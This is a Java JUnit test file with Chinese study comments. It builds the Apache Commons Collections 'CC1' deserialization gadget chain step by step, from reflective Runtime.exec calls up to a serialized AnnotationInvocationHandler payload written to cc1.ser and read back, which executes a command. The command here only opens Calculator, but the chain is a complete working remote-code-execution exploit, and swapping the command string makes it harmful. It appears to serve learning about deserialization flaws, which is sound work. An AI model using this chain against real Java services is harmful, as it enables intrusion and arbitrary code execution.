package org.example.sec.reflection;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class Exp {
    static String cmd = "open";
    static String path = "/System/Applications/Calculator.app";
    static String full = cmd + " " + path;

    //反序列化，只序列化对象的信息，不序列化静态字段方法
    //Runtime类没有实现Serializable，如何将它序列化呢？(反射)
    //Class对象是可以反序列化的
    //在Java中用来表示运行时类型信息的对应类就是Class类，Class类也是一个实实在在的类，存在于JDK的java.lang包中
    @Test
    public void exp1() throws Exception {
        Class clazz = Class.forName("java.lang.Runtime");
        clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), full);
    }

    @Test
    public void exp2() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Class clazz = Class.forName("java.lang.ProcessBuilder");
        ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(new String[][]{{"open", "/System/Applications/Calculator.app"}})).start();
    }

    //invoke 方法探究
    @Test
    public void exp3() throws Exception {
        Runtime rt = (Runtime) Runtime.class.getMethod("getRuntime").invoke(null);
        //rt.exec(full);
        Fruit fruit = Apple.class.getConstructor().newInstance();
        Apple.class.getMethod("eat").invoke(fruit, null);

        //invoke 表现出多态
        fruit = BigApple.class.getConstructor().newInstance();
        Apple.class.getMethod("eat").invoke(fruit, null);

    }

    @Test
    public void exp4() {
        //在构造函数的时候传入要执行的方法，方法对应的参数类型，和参数值。
        // 再通过transform方法时候传入Runtime.getRuntime()对象,就会造成任意代码执行，
        // 即执行了input对象的iMethodName方法
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{full}),
        };
        //ChainedTransformer实现了Transformer接口的⼀个类，它的transform方法作用是对传进来的Transformer数组进行遍历，
        // 并把前一个回调返回的结果，作为后一个回调的参数进行传入。
        Transformer transformerChain = new ChainedTransformer(transformers);
        //把Transformer实现类分别绑定到map的key和value上，当map的key或value被修改时，
        // 会调用对应Transformer实现类的transform()方法。把chainedtransformer绑定到一个TransformedMap上，
        // 当此map的key或value发生改变时，就会自动触发chainedtransformer。不同的Map类型有不同的触发规则。
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }

    @Test
    public void exp5() throws Exception {
        Class clzz = Runtime.class;
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clzz),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                //Method的invoke方法
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{full}),

        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }

    //但在实际反序列化时，我们需要找到一个类，它在反序列化的readObject逻辑里有类似的写入、修改等操作来触发链条。
    //JDK8u71后跟新了AnnotationInvocationHandler的readObject方法
    @Test
    public void exp6() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{full}),

        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        //这个不能为空
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        //只有在innerMap不是null的时候才会进入里面执行setValue，否则不会进入也就不会触发漏洞
        //构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        FileOutputStream fileOutputStream = new FileOutputStream("./cc1.ser");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(handler);
        objectOutputStream.close();
        fileOutputStream.close();

        FileInputStream fileInputStream = new FileInputStream("./cc1.ser");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        objectInputStream.close();
        fileInputStream.close();

    }
}
